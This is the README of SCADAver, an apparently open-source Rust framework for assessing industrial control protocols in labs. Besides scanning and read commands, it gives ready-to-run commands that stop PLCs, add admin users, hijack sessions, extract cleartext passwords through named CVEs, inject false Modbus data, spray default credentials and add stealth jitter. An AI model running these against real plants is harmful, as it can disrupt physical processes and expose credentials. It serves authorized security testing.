# SCADAver

<!-- markdownlint-disable MD013 -->

> A Rust-powered, multi-protocol OT/ICS security framework for authorized labs.

[![CI](https://github.com/Whispergate/SCADAVER/actions/workflows/ci.yml/badge.svg)](https://github.com/Whispergate/SCADAVER/actions/workflows/ci.yml)
[![Crates.io](https://img.shields.io/crates/v/scadaver)](https://crates.io/crates/scadaver)
[![License: PolyForm Noncommercial 1.0](https://img.shields.io/badge/License-PolyForm%20Noncommercial%201.0-blue)](LICENSE)
[![Rust](https://img.shields.io/badge/Rust-1.87%2B-orange)](https://www.rust-lang.org)
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-lightgrey)](https://github.com/Whispergate/SCADAVER/releases)

SCADAver discovers, fingerprints, enumerates, and performs controlled security validation across common industrial protocols. One binary provides a command-line interface, terminal UI, browser UI, REST API, persistent device database, and MQTT client shell. The protocol stack can also be used as a Rust library without the CLI dependencies.

> [!CAUTION]
> SCADAver is for systems you own or have explicit written permission to test. Several operations can write controller data, change PLC state, test credentials, or disrupt a lab device. Treat every OT target as production-adjacent until proven otherwise.

**Project status:** This project is experimental. It is built from public protocol documentation, vulnerability advisories, and open-source security research. Hardware access is limited, so behavior can vary by device model and firmware. Hardware-backed verification, corrections, and additional simulators are welcome.

## Highlights

- Concurrent host and CIDR discovery across major OT/ICS protocols
- CLI, TUI, browser UI, REST API, and MQTT shell in one binary
- Read-only enumeration plus clearly identified sensitive and write operations
- MQTT 3.1.1 and 5.0 sessions, TLS, Sparkplug detection, and guarded assessment tools
- Nmap XML import and JSON or CSV device export
- Persistent device, tag, and value history in SQLite
- Configurable defaults and operator-supplied credential lists
- Per-connection protocol fingerprint randomization and optional stealth jitter
- Embedded ICS research reference database with roughly 300 entries
- Local simulators and loopback integration tests for safe regression testing
- Library-only builds with CLI, TUI, web, and database dependencies excluded

## Installation

SCADAver requires Rust 1.87 or newer when building from source.

### Release binaries

Prebuilt Windows, Linux, and macOS binaries are published on the [GitHub Releases page](https://github.com/Whispergate/SCADAVER/releases).

### crates.io

```sh
cargo install scadaver
```

The crates.io package can trail the repository. Build from source when you need the current `main` branch feature set.

### Source

```sh
git clone https://github.com/Whispergate/SCADAVER.git
cd SCADAVER
cargo build --release
```

The binary is written to `target/release/scadaver` or `target/release/scadaver.exe`.

## Quick Start

Start with read-only discovery and enumeration against an authorized lab target:

```sh
# Probe one host across every autodetect protocol
scadaver -i 10.0.0.50 scan

# Scan a CIDR range
scadaver --network 10.0.0.0/24 scan

# Target one supported CLI protocol
scadaver -i 10.0.0.50 --protocol siemens scan

# Read Siemens digital I/O state
scadaver -i 10.0.0.50 --protocol siemens get io

# Launch the terminal or browser interface
scadaver tui
scadaver web

# Open the interactive MQTT shell with a pre-populated broker
scadaver mqtt --host 10.0.0.60 --port 1883
```

Use `scadaver --help` and `scadaver <command> --help` for the authoritative command syntax.

## Protocol Coverage

| Protocol or family | Default port(s) | Discovery and enumeration | Controlled validation and actions |
| --- | ---: | --- | --- |
| S7Comm / ISO-on-TCP | TCP 102 | COTP fingerprinting, PDU and device data, CPU state, I/O and DB reads | I/O and DB writes, CPU state changes, password testing |
| ADS/AMS / TwinCAT | UDP 48899, TCP 48898 | Broadcast discovery, AMS Net ID, runtime state, symbols | State and symbol writes, route and CX web-control actions |
| Modbus TCP / Schneider FC90 | TCP 502, UDP 1740 | Device ID, register, input-register, and coil reads | FC5/6/16 writes, FC90 actions, false-data injection, lab server |
| EtherNet/IP and CIP | TCP/UDP 44818 | ListIdentity, controller identity, Logix tag and UDT enumeration | Typed and raw tag writes |
| SLMP / MC Protocol 3E | TCP 5007, UDP 5561 | MELSEC discovery and D/M device reads | D word, M bit, and controller-state writes |
| FINS | TCP/UDP 9600 | SYSMAC discovery, device information, CPU state, DM reads | DM writes and CPU-state changes |
| eWON IPCONF, HTTP, and published Modbus tags | UDP 1507, TCP 80, 502 | IPCONF discovery, device metadata, and HTTP tag view | Published Modbus coil/register reads and writes when explicitly configured on the Flexy |
| ProConOS and WebVisit | TCP 1962, 80/8080 | Controller identity and WebVisit tag enumeration | Tag writes and password-retrieval validation |
| SNMPv1/v2c | UDP 161 | Community discovery, GET, GETNEXT, walk, system and topology data | Guarded SNMP SET |
| IEC 60870-5-104 | TCP 2404 | TESTFR detection and General Interrogation | Single and double commands |
| MQTT and Sparkplug B | TCP 1883, 8883 | Anonymous access, `$SYS` recon, topic monitoring, retained data, Sparkplug detection | Pub/sub, ACL probes, session tests, guarded Sparkplug fuzzing |
| BACnet/IP | UDP 47808 | Who-Is/I-Am discovery and device property reads | Read-only client surface |
| DNP3 | TCP 20000 | Link detection, device attributes, integrity polling | Read-only client surface |
| OPC UA Binary | TCP 4840 | HEL/ACK, secure-channel setup, endpoint and security-mode discovery | Read-only endpoint assessment |
| Generic HTTP(S) | TCP 80, 443, 8080 | OT port scanning and web endpoint checks | Default-credential and Shellshock validation |

The all-protocol host and CIDR sweep includes BACnet, DNP3, and OPC UA. The explicit `--protocol` choices exposed by the CLI are `bacnet`, `beckhoff`, `dnp3`, `siemens`, `schneider`, `modbus`, `rockwell`, `mitsubishi`, `omron`, `phoenix`, `ewon`, `snmp`, `iec104`, `enip`, `mqtt`, and `opc-ua` (also accepted as `opcua`).

### Scan Fingerprint Hardening

SCADAver randomizes protocol fields that would otherwise be stable across connections, including Modbus transaction IDs, Siemens PDU references, the FINS source node, and the Beckhoff route hostname. IEC 104 sessions close gracefully. Stealth mode adds randomized probe order and 100 to 400 ms of inter-probe jitter:

```sh
scadaver -z -i 10.0.0.50 scan
```

Stealth mode reduces simple scan fingerprinting. It does not make traffic invisible to network monitoring or process-aware OT defenses.

## Interfaces

### CLI

```text
scadaver [OPTIONS] [COMMAND]
```

| Option | Short | Default | Purpose |
| --- | ---: | ---: | --- |
| `--ip <IP>` | `-i` | none | Target a single host |
| `--network <CIDR>` | | none | Scan every address in a CIDR range |
| `--port <PORT>` | `-p` | protocol default | Override the target port |
| `--timeout <SECONDS>` | `-t` | config or `5` | Override the network timeout |
| `--protocol <PROTOCOL>` | | autodetect | Select a supported targeted or broadcast protocol |
| `--stealth` | `-z` | config or off | Shuffle probes and add jitter |
| `--live` | | off | Query the device now and update its protocol-specific inventory/cache |
| `--no-cache` | | off | Query live without reading or changing the local inventory |
| `--confirm-stale` | | off | Permit a write when matching inventory is older than 48 hours |

| Command | Purpose |
| --- | --- |
| `scan` | Targeted, broadcast, all-protocol, or CIDR discovery |
| `get` | Read identity, state, tags, registers, coils, OIDs, or protocol data |
| `set` | Write controller state, tags, registers, coils, OIDs, or protocol data |
| `run` | Execute a vendor-specific or generic assessment action |
| `tui` | Launch the interactive terminal UI |
| `web` | Start the browser UI and REST service |
| `db` | Add or remove devices and query the embedded research references |
| `mqtt` | Open the interactive MQTT client shell |
| `import` | Import hosts and open ports from nmap XML |
| `export` | Export the device database as JSON or CSV |

### eWON Flexy published Modbus tags

When an authorized Flexy has published Modbus variables enabled, use the
dedicated commands below. They use standard Modbus TCP with Flexy's default
unit ID `100`; use `--unit-id` only when the device configuration differs.
`-p 0` resolves to Modbus TCP port `502`.

```sh
# Read a coil and a 16-bit holding register
scadaver -i 10.0.0.50 get ewon-coil 500
scadaver -i 10.0.0.50 get ewon-register 501 --type u16

# Read/write a 32-bit or float value. Flexy ordering is low 16-bit word first.
scadaver -i 10.0.0.50 get ewon-register 502 --type f32
scadaver -i 10.0.0.50 set ewon-register 502 73.5 --type f32
scadaver -i 10.0.0.50 set ewon-coil 500 off
```

Supported register types are `u16`, `i16`, `u32`, `i32`, and `f32`. Only write
variables that are explicitly published as writable in the authorized device;
`set tag --protocol ewon` remains unsupported because the legacy eWON HTTP tag
view has no standard safe write API.

### Terminal UI

Run `scadaver` with no command or launch it explicitly:

```sh
scadaver tui
```

| Key | Action |
| --- | --- |
| `A` | Add or probe an IP, optional port, transport, or vendor hint |
| `S` | Open broadcast scan menu |
| `E` | Open actions for the selected device |
| `M` | Open the MQTT monitor |
| `U` | Set MQTT credentials for the next connection |
| `B` | Open research references for the selected vendor |
| `I` | Import an nmap XML file |
| `W` | Set a credential wordlist path |
| `R` | Rescan the selected device |
| `D` | Delete the selected database record |
| `/` | Search or filter devices |
| `O` | Zoom the output panel |
| `C` | Clear output |
| `F` | Toggle JSON or CSV export format |
| `X` | Export the device database |
| `t` | Toggle MQTT TLS for the next connection |
| `v` | Toggle MQTT 3.1.1 or 5.0 for the next connection |
| `Z` | Toggle stealth mode |
| `?` | Open help |
| `Q` | Quit with confirmation |

Sensitive reads and write actions in the TUI require typed confirmation. Devices responding on multiple protocols are stored as `multi`; use `V` inside the action menu to choose the protocol view.

### MQTT Shell

```sh
scadaver mqtt
scadaver mqtt --host broker.lab --port 1883
```

The three-level shell supports connection configuration, MQTT 3.1.1 or 5.0, TLS, last-will settings, topic subscriptions, publishing, logging, filters, topic statistics, `$SYS` recon, retained-message hunting, ACL probes, stored-session testing, and the guarded Sparkplug B fuzzer. Type `help` at any prompt and run `spfuzz --dry-run` before an active fuzzing session.

### Web UI and API

```sh
scadaver web
scadaver web --host 0.0.0.0 --port 9000
```

The default listener is `127.0.0.1:8888`. At startup, SCADAver uses the configured API key or generates a 32-character hexadecimal session token, prints it to the terminal, and opens the browser with `?key=<token>`. REST clients pass the token in the `X-API-Key` header on protected operations.

The browser UI provides device persistence, targeted and broadcast scans, tag browsing and writes, history, port scanning, exports, protocol actions, and WebSocket-backed live device and tag updates. Binding to a non-loopback address exposes the service to the network, so use a fixed API key and an isolated assessment network.

Key routes include:

| Route | Purpose |
| --- | --- |
| `GET /health` | Health check |
| `GET /api/interfaces` | Local network interfaces |
| `GET/POST /api/devices` | List or save devices |
| `POST /api/scan` | Broadcast discovery |
| `POST /api/scan/ip` | All-protocol host scan |
| `POST /api/device/tags` | Enumerate device tags or points |
| `POST /api/device/write` | Write a device tag or point |
| `GET /api/device/history?ip=<IP>&vendor=<VENDOR>` | Device tag or value history |
| `POST /api/exploit/<ACTION>` | Run an assessment action |
| `GET /api/export?format=json\|csv` | Export stored devices |
| `WS /ws/events` | Live device events |
| `WS /ws/monitor/<IP>?vendor=<VENDOR>` | Live tag monitoring |

The route table describes the current interface, but it is not a substitute for network isolation. Review `src/web/routes.rs` before exposing the service beyond localhost.

## Discovery and Enumeration

### Network Scanning

```sh
# All-protocol probe of a single host
scadaver -i 10.0.0.50 scan

# CIDR sweep
scadaver --network 10.0.0.0/24 scan

# Protocol-specific broadcast discovery (no -i needed; picks the right interface)
scadaver --protocol beckhoff scan      # UDP 48899 — returns NetID, TC version, kernel
scadaver --protocol enip scan          # UDP 44818 — returns CIP vendor, device type, product name
scadaver --protocol ewon scan          # UDP 1507  — returns serial, firmware, product code
scadaver --protocol schneider scan     # UDP 1740  — returns device name, firmware, Modbus unit ID
scadaver --protocol mitsubishi scan    # GX Works3 UDP 5561 + SLMP 5006 broadcast
scadaver --protocol bacnet scan        # UDP 47808 Who-Is — collects all I-Am responses

# OT port scan with banner grab
scadaver run portscan -i 10.0.0.50
scadaver run portscan -i 10.0.0.50 --ports 8888,9000
```

The port scanner checks 15 well-known OT ports (102, 502, 2404, 4840, 5007, 9600, 20000, 44818, 47808, and others) and grabs the first 80 bytes of each banner.

### Siemens S7Comm

```sh
# Scan: returns hardware MLFB, firmware version, CPU state (Running/Stopped/Hold/Startup)
scadaver -i 10.0.0.10 --protocol siemens scan

# Device identity and module information
scadaver -i 10.0.0.10 --protocol siemens get info

# CPU run/stop state
scadaver -i 10.0.0.10 --protocol siemens get state

# Digital I/O and merker bit map (inputs, outputs, merkers by byte.bit)
scadaver -i 10.0.0.10 get io

# Read raw bytes from a Data Block (DB1, offset 0, 64 bytes)
scadaver -i 10.0.0.10 get db 1 0 64
scadaver -i 10.0.0.10 get db 5 128 16 --password SIMATIC
```

### Beckhoff TwinCAT

```sh
# Broadcast discovery: returns NetID, TwinCAT version, kernel version
scadaver --protocol beckhoff scan

# Unicast probe
scadaver -i 10.0.0.20 --protocol beckhoff scan

# ADS state: RUN / STOP / CONFIG / RECONFIG
scadaver -i 10.0.0.20 --protocol beckhoff get state

# Full symbol table with values (up to 500 scalar symbols)
scadaver -i 10.0.0.20 --protocol beckhoff get tags

# Read one named symbol
scadaver -i 10.0.0.20 --protocol beckhoff get tag MAIN.valve
scadaver -i 10.0.0.20 --protocol beckhoff get tag MAIN.pump_speed
```

Device info (TC3 only) includes target type, hardware model, serial number, OS name and version.

### Schneider Electric / Modbus

```sh
# Discovery: Schneider proprietary UDP + Modbus Device ID fallback
scadaver -i 10.0.0.30 --protocol schneider scan

# Holding registers (FC3) — displayed as 4xxxx addresses
scadaver -i 10.0.0.30 get register 0 20
scadaver -i 10.0.0.30 get register 100 10 --port 502

# Input registers (FC4) — displayed as 3xxxx addresses
scadaver -i 10.0.0.30 get input-register 0 10

# Coils (FC1) — ON/OFF per bit
scadaver -i 10.0.0.30 get coil 0 16

# Check for legacy session cookie in FwLog.txt
scadaver -i 10.0.0.30 get session
```

### Rockwell / EtherNet/IP CIP

```sh
# Discovery: CIP List Identity + optional Logix Get Attribute
scadaver -i 10.0.0.40 --protocol rockwell scan

# Device identity: vendor, product type, product code, revision, serial, product name
scadaver -i 10.0.0.40 --protocol rockwell get info

# Readable Logix tag table: named types and type-level RW/RO capability
scadaver -i 10.0.0.40 --protocol rockwell get tags

# Bounded live-value sample (first 50 tags); UDTs are decoded through templates
scadaver -i 10.0.0.40 --protocol rockwell get tags --values

# Read one named tag (typed scalar decoding; UDT templates are expanded)
scadaver -i 10.0.0.40 --protocol rockwell get tag MAIN.conveyor_speed
scadaver -i 10.0.0.40 --protocol rockwell get tag Program:SafetyPLC.EmergencyStop
```

UDT fields are recursively expanded; BOOL arrays and packed BOOLs are handled automatically.
Colour is automatic in an interactive terminal. Use `--color always` or `--color never`
to override it, and add `-v` to any command for the complete safe diagnostic chain.

### Mitsubishi SLMP

```sh
# Discovery: GX Works3 UDP 5561 broadcast, SLMP UDP 5006, TCP 5007 fallback
scadaver -i 10.0.0.50 --protocol mitsubishi scan

# D word registers (word area, e.g. D0–D9)
scadaver -i 10.0.0.50 get d 0 10
scadaver -i 10.0.0.50 get d 100 20

# M bit devices (bit area, e.g. M0–M15)
scadaver -i 10.0.0.50 get m 0 16
```

### Omron FINS

```sh
# Discovery: FINS/UDP Controller Data Read, TCP two-stage fallback
# Returns node address, model, version
scadaver -i 10.0.0.60 --protocol omron scan

# CPU state: Stop / Run / Monitor / Program
scadaver -i 10.0.0.60 --protocol omron get state

# DM word area (word area 0x82)
scadaver -i 10.0.0.60 get dm 0 10
scadaver -i 10.0.0.60 get dm 200 20
```

### Phoenix Contact

```sh
# Discovery: ProConOS TCP 1962 multi-step handshake
# Returns PLC type, firmware, build
scadaver -i 10.0.0.70 --protocol phoenix scan

# WebVisit tag list from project file
scadaver -i 10.0.0.70 --protocol phoenix get tags

# Read live WebVisit tag values
scadaver -i 10.0.0.70 --protocol phoenix get info
```

### eWON

```sh
# IPCONF UDP discovery: returns serial, product code, firmware, identifier
scadaver -i 10.0.0.80 --protocol ewon scan

# HTTP REST tag read (/api/tags/)
scadaver -i 10.0.0.80 get tags --protocol ewon
```

### IEC 60870-5-104

```sh
# Detect IEC 104 on port 2404 (TESTFR handshake)
scadaver -i 10.0.0.90 --protocol iec104 scan

# General Interrogation — reads all data objects (IOAs)
# Decodes: single-point, double-point, normalized, scaled, IEEE float, counters
# with optional CP56Time2a timestamps
scadaver -i 10.0.0.90 get gi
```

### DNP3

```sh
# Detect the lab DNP3 outstation on port 20000 (master 1, outstation 10).
# Broadcasts are deliberately not used because compliant DNP3 outstations do
# not answer broadcast traffic.
scadaver -i 10.0.0.95 --protocol dnp3 scan

# Read Group 0 device attributes.
scadaver -i 10.0.0.95 --protocol dnp3 get tags
```

Integrity polling (Class 0 data request) returns up to 32 frames.

### BACnet/IP

```sh
# Broadcast Who-Is on UDP 47808 — collects all I-Am responses
scadaver --protocol bacnet scan

# Unicast probe — returns instance_id, vendor_id, max_apdu,
# object_name, vendor_name, description, firmware_revision
scadaver -i 10.0.0.100 --protocol bacnet scan
```

### SNMP

```sh
# Brute-force community string (tries: public, private, community, admin, and others)
scadaver -i 10.0.0.110 get community

# Full system enumeration: MIB-II system group, interface table,
# ARP cache, route table, automatic CVE matching
scadaver -i 10.0.0.110 get enum -c public

# Get a specific OID
scadaver -i 10.0.0.110 get oid 1.3.6.1.2.1.1.1.0 -c public   # sysDescr
scadaver -i 10.0.0.110 get oid 1.3.6.1.2.1.1.6.0 -c public   # sysLocation

# Walk an OID subtree (up to 512 GETNEXT iterations)
scadaver -i 10.0.0.110 get walk 1.3.6.1.2.1 -c public         # full MIB-II
scadaver -i 10.0.0.110 get walk 1.3.6.1.2.1.2 -c public       # interfaces only
```

`get enum` automatically runs CVE matching against the discovered `sysDescr` and OID. Matches include CVE-1999-0517 (default community accepted), SCALANCE X200 CVE-2007-5846, SCALANCE CP/SINEMA CVE-2021-41991, SCALANCE S auth bypass CVE-2013-3634, and APC write community exposure.

### OPC UA

```sh
# Transport detection performs HEL/ACK only.
scadaver -i 10.0.0.120 --protocol opcua scan

# Endpoint discovery completes HEL, OpenSecureChannel, and GetEndpoints.
scadaver -i 10.0.0.120 --protocol opcua get tags
```

## Write and Control

> [!WARNING]
> All write and control operations modify live controller state. Verify the target is an authorized lab device before executing any `set` or `run` command.

### Modbus

```sh
# Write one holding register (FC6)
scadaver -i 10.0.0.30 set register 100 1234

# Write multiple holding registers (FC16, comma-separated values)
scadaver -i 10.0.0.30 set registers 0 100,200,300,400

# Write one coil (FC5)
scadaver -i 10.0.0.30 set coil 5 on
scadaver -i 10.0.0.30 set coil 5 off
```

### Siemens S7Comm

```sh
# Toggle CPU state (Running ↔ Stopped via TIA Portal OMS+ protocol)
scadaver -i 10.0.0.10 --protocol siemens set state flip

# Set CPU to Run or Stop explicitly (requires auth if password-protected)
scadaver -i 10.0.0.10 --protocol siemens set state run
scadaver -i 10.0.0.10 --protocol siemens set state stop --password SIMATIC

# Write digital outputs (8-bit binary string, leftmost = Q0.0)
scadaver -i 10.0.0.10 set output 10110100

# Write merkers at a specific byte offset
scadaver -i 10.0.0.10 set merkers 10110100,4

# Write raw bytes to a Data Block (hex string, no spaces)
scadaver -i 10.0.0.10 set db 1 0 deadbeef
scadaver -i 10.0.0.10 set db 5 128 0100 --password SIMATIC
```

### Beckhoff TwinCAT

```sh
# Change TwinCAT runtime state
scadaver -i 10.0.0.20 --protocol beckhoff set state run
scadaver -i 10.0.0.20 --protocol beckhoff set state stop
scadaver -i 10.0.0.20 --protocol beckhoff set state config

# Write raw bytes to a symbol by name (hex, no spaces)
# Looks up the symbol in the ADS symbol table, then writes to its address
scadaver -i 10.0.0.20 --protocol beckhoff set tag MAIN.valve=01
scadaver -i 10.0.0.20 --protocol beckhoff set tag MAIN.pump_speed=05DC
```

### Rockwell / EtherNet/IP CIP

```sh
# Write a typed tag value (hex bytes matching the CIP type)
scadaver -i 10.0.0.40 --protocol rockwell set tag MAIN.conveyor_speed=01F4
scadaver -i 10.0.0.40 --protocol rockwell set tag Program:SafetyPLC.EmergencyStop=01
```

### Mitsubishi SLMP

```sh
# Write D word registers (comma-separated u16 values)
scadaver -i 10.0.0.50 set d 100 1000,2000
scadaver -i 10.0.0.50 set d 0 0,0,0,0,0

# Write M bit devices (binary string of 0/1 characters)
scadaver -i 10.0.0.50 set m 0 10110100

# PLC run/stop/pause via captured GX Works2 UDP protocol (port 5560)
scadaver -i 10.0.0.50 --protocol mitsubishi set state stop
scadaver -i 10.0.0.50 --protocol mitsubishi set state run
scadaver -i 10.0.0.50 --protocol mitsubishi set state monitor
```

### Omron FINS

```sh
# Write DM area words (comma-separated u16 values)
scadaver -i 10.0.0.60 set dm 0 1234,5678
scadaver -i 10.0.0.60 set dm 100 0,0,0,0

# CPU mode change
scadaver -i 10.0.0.60 --protocol omron set state stop
scadaver -i 10.0.0.60 --protocol omron set state run
```

### Phoenix Contact

```sh
# PLC run/stop (ILC 150 and ILC 390 supported)
scadaver -i 10.0.0.70 --protocol phoenix set state stop
scadaver -i 10.0.0.70 --protocol phoenix set state run

# Write a WebVisit tag value
scadaver -i 10.0.0.70 --protocol phoenix set tag WebVisit.pump_cmd=01
```

### IEC 60870-5-104

```sh
# Single command (TypeID 45 — C_SC_NA_1)
scadaver -i 10.0.0.90 set sc 1001 on
scadaver -i 10.0.0.90 set sc 1001 off

# Double command (TypeID 46 — C_DC_NA_1)
# States: 1=off, 2=on, 3=indeterminate
scadaver -i 10.0.0.90 set dc 2001 2
scadaver -i 10.0.0.90 set dc 2001 1
```

### SNMP SET

```sh
# Requires a write community string. --confirm flag is mandatory.
scadaver -i 10.0.0.110 set oid 1.3.6.1.2.1.1.6.0 "Server Room A" \
    --community private --confirm

scadaver -i 10.0.0.110 set oid 1.3.6.1.2.1.1.3.0 42 \
    --community private --type int --confirm
```

## Exploits and Attacks

> [!CAUTION]
> The techniques in this section can crash devices, disrupt physical processes, expose credentials, or permanently alter controller configuration. Run them only against systems you own or have explicit written authorization to test.

### Beckhoff CX9020 — CVE-2015-4051 (ICSA-15-258-03)

Unauthenticated UPnP SOAP commands against the CX config service on TCP 5120:

```sh
# Reboot the controller immediately
scadaver -i 10.0.0.20 run reboot

# Add an administrator-level user account
scadaver -i 10.0.0.20 run add-user operator:Password1

# Write raw bytes to a named ADS symbol without authentication
scadaver -i 10.0.0.20 run write-symbol MAIN.valve=01
scadaver -i 10.0.0.20 run write-symbol MAIN.pump_speed=05DC
```

### Schneider Electric — FC90 Unauthenticated PLC Control

Modbus function code 0x5A (proprietary Schneider) requires a 30-frame init sequence on M340/Quantum/Premium; TM221 uses a shorter path:

```sh
# Stop M340, Quantum, or Premium (no authentication)
scadaver -i 10.0.0.30 run fc90-stop

# Start M340, Quantum, or Premium
scadaver -i 10.0.0.30 run fc90-start

# Stop TM221 (SoMachine Basic)
scadaver -i 10.0.0.30 run fc90-stop --model tm221

# Force a physical output bit (On / Off / Unforce)
scadaver -i 10.0.0.30 run fc90-force --output 0x11 --state on
scadaver -i 10.0.0.30 run fc90-force --output 0x11 --state unforce
```

### Schneider Electric — LED Flash

Sends a Unity Pro identification packet to UDP 27127, causing the identification LED to flash on Modicon M340, M580, Quantum, and Premium devices. Useful for confirming physical identity of a device during an assessment:

```sh
scadaver -i 10.0.0.30 run flash-led
```

### Schneider Electric — Session Hijack

Reads `/usr/Syslog/FwLog.txt` from the embedded web server, extracts the active session cookie from "Firmware core2" log lines, then uses the cookie to issue start/stop commands without credentials:

```sh
# Step 1: retrieve and display the session cookie
scadaver -i 10.0.0.30 get session

# Step 2: use the hijacked session to stop or start the PLC
scadaver -i 10.0.0.30 run session-stop
scadaver -i 10.0.0.30 run session-run
```

### eWON — CVE-2019-9015 (ICSA-19-099-01)

Retrieves all user accounts including cleartext passwords from the credential store via an unauthenticated POST to `/wrcgi.bin/wsdReadForm`. Passwords are XOR-obfuscated in the firmware; SCADAver decodes them automatically:

```sh
scadaver -i 10.0.0.80 run ewon-creds
scadaver -i 10.0.0.80 run ewon-creds --max-users 50

# Same operation via the get subcommand
scadaver -i 10.0.0.80 get creds
scadaver -i 10.0.0.80 get creds --max-users 50
```

Returns: username, first name, last name, plaintext password, access rights level.

### Phoenix Contact WebVisit — CVE-2016-8366

Retrieves passwords from the WebVisit HMI project file (`.teq`). The file is served unauthenticated and contains both cleartext and hashed entries:

```sh
scadaver -i 10.0.0.70 run passwords
```

Returns: user level, cleartext password, 64-character hex hash.

### Modbus False Data Injection (SCASS §6.3.1)

Continuously overwrites a Modbus register or coil to inject a forged value. Runs until `Ctrl-C` or `--count` is reached:

```sh
# Inject register 100 = 500 every 2 seconds (default interval), indefinitely
scadaver -i 10.0.0.30 run fdi --address 100 --value 500

# Inject a coil ON every second
scadaver -i 10.0.0.30 run fdi --address 5 --value 1 --target coil --interval 1

# Run exactly 100 write cycles then exit
scadaver -i 10.0.0.30 run fdi --address 100 --value 9999 --count 100

# Slower injection with a long inter-write gap
scadaver -i 10.0.0.30 run fdi --address 0 --value 0 --interval 30
```

### Rogue Modbus TCP Server

Binds locally and impersonates a Modbus slave with fixed responses. Useful for man-in-the-middle scenarios, HMI testing, and historian deception. Does not require `-i`:

```sh
# Serve register=42 and coil=ON on port 502
scadaver run modbus-server --port 502 --reg-value 42 --coil-value 1

# Serve zeroed registers on an unprivileged port
scadaver run modbus-server --port 5020 --reg-value 0 --coil-value 0
```

The server handles FC1 (coils), FC3 (holding registers), and silently ACKs FC5/FC6/FC16 writes. All other function codes return Modbus exception 0x01.

### HTTP Default Credential Spray

Tries 72 ICS-specific username/password pairs against an HTTP Basic Auth endpoint. Custom wordlists are tried before the built-in defaults:

```sh
scadaver -i 10.0.0.50 run default-creds
scadaver -i 10.0.0.50 run default-creds --path /config --http-port 8080
scadaver -i 10.0.0.50 run default-creds --wordlist /path/to/creds.txt
```

Wordlist format: one `username:password` pair per line, `#` for comments.

### Shellshock Scanner — CVE-2014-6271

Tests CGI endpoints on PLC and HMI web servers for the Bash environment injection vulnerability:

```sh
scadaver -i 10.0.0.50 run shellshock
scadaver -i 10.0.0.50 run shellshock --http-port 8080
```

## MQTT Assessment

### Broker Scan and Recon

```sh
# Passive probe: anonymous CONNECT, $SYS subscribe, Sparkplug B detection
scadaver -i 10.0.0.60 --protocol mqtt scan
```

Returns: anonymous access, first `$SYS/broker/*` topic and value, and whether Sparkplug B traffic was observed on `spBv1.0/#`.

### Direct CLI publish and read-back

Normal MQTT publishes are events: a client that connects later cannot read a prior
non-retained message. For a repeatable lab write/read-back, publish a retained value,
then use a fresh live read. `--type auto` accepts even-length hexadecimal text as
bytes; use `--type text` to make the payload unambiguous.

```sh
# Local lab example: publish retained UTF-8 text, then read it from a new session.
scadaver set tag scadaver/demo=running --type text --retain --protocol mqtt -i 127.0.0.1 -p 1883
scadaver get tag scadaver/demo --protocol mqtt -i 127.0.0.1 -p 1883 --live

# Clear the retained test value when finished.
scadaver set tag scadaver/demo= --type text --retain --protocol mqtt -i 127.0.0.1 -p 1883
```

### Interactive Shell

```sh
scadaver mqtt
scadaver mqtt --host 10.0.0.60
scadaver mqtt --host 10.0.0.60 --port 8883
```

After connecting, available commands include:

| Command | Purpose |
| --- | --- |
| `subscribe <topic>` | Subscribe at QoS 0 |
| `unsubscribe <topic>` | Unsubscribe |
| `publish <topic> <payload>` | Publish a message |
| `acl-probe <topic>` | Test ACL wildcard variants via SUBACK return codes |
| `acl-hunt` | Wildcard subscribe + automatic payload classification |
| `creds <user> <pass>` | Test one credential pair |
| `sparkplug-fuzz` | Launch the guarded Sparkplug B fuzzer |

#### ACL Probing

`acl-probe` expands a topic into all meaningful wildcard variants:

- Exact topic: `factory/line1/motor`
- Single-level wildcards: `factory/+/motor`, `+/line1/motor`, `factory/line1/+`
- Multi-level wildcards: `#`, `factory/#`, `factory/line1/#`

It subscribes to each in turn and reports the SUBACK return code (granted vs. refused).

#### Payload Classification

The `acl-hunt` command subscribes broadly and classifies every received message:

| Tag | Detection rule |
| --- | --- |
| `sparkplug-b` | Topic starts with `spBv1.0/` or `spAv1.0/` — payload shown as hex |
| `json` | UTF-8, trimmed string starts with `{` or `[` |
| `number` | Parses as `f64` |
| `bool` | Case-insensitive `true` or `false` |
| `text` | Printable ASCII only |
| `binary` | Non-UTF-8 payload |

Messages flagged as sensitive are highlighted separately. Sensitivity triggers on JWT headers (`eyJ`), and keyword matches in topic or payload for `password`, `token`, `secret`, `credential`, `apikey`, and variants.

### Sparkplug B Fuzzer

The fuzzer is launched from within the MQTT shell. It requires a typed `YES` confirmation, enforces a minimum 50 ms delay between every published message, uses QoS 0 and `retain=false` throughout, and publishes a cleanup NDEATH on exit. Run `--dry-run` first to preview what will be sent without transmitting anything.

| Category | Risk | Description |
| --- | --- | --- |
| `topic` | LOW | 34 cases: case variations on `spBv1.0`, wrong version strings, missing segments, extra slashes, unknown message types, long node/group segments, encoding tricks, `STATE/` variants, `$` system topics |
| `sequence` | LOW | 13 seq values: 0, 1, 127, 255, 256 (rollover point), back to 0, gap skip, backwards, duplicate, 65535, 2³²-1, u64::MAX, u64::MAX-1 |
| `malformed` | MEDIUM | 16 corrupt protobuf payloads: empty, null bytes, 0xFF, truncated varint, overlong varint, wrong wire type, unknown high field number, valid-then-garbage, all-zero and all-0xFF 64-byte blobs, bit-flipped valid payload, truncated valid payload, three deterministic pseudo-random sizes (16/64/256 bytes) |
| `boundary` | MEDIUM | Int8/16/32 and UInt8/16/32/64 boundary and overflow values; string injection payloads covering format strings, SQLi, XSS, path traversal, command injection, ANSI escape; `is_null=true` with a value set |
| `ordering` | MEDIUM | DDATA before NBIRTH, double NBIRTH without NDEATH, NDEATH then DDATA, DBIRTH without NBIRTH, rapid lifecycle churn (three NBIRTH/NDEATH cycles) |

Targeted spoofing (opt-in via `--probe-write`, second `YES` required): for each node discovered during passive listening, sends NDEATH, waits 500 ms, then sends NBIRTH and NCMD Rebirth. If a device was discovered under the node, also sends DDEATH and DBIRTH for that device.

## Configuration and Local Data

SCADAver stores configuration under the operating system's standard configuration directory in a `scadaver` folder. Typical locations are `~/.config/scadaver` on Linux and `%APPDATA%\scadaver` on Windows.

Launching the TUI creates commented sample configuration and credential files when they do not already exist:

```text
scadaver/
├── config.toml
├── creds.toml
└── devices.db
```

`config.toml` supports network defaults and web settings:

```toml
[defaults]
timeout = 5
stealth = false

[web]
host = "127.0.0.1"
port = 8888
# api_key = "replace-with-a-long-random-value"
```

`creds.toml` accepts operator-supplied Siemens passwords and HTTP Basic credential pairs. These entries are tried before the built-in defaults and should contain lab-specific test credentials, not unrelated production secrets:

```toml
[siemens]
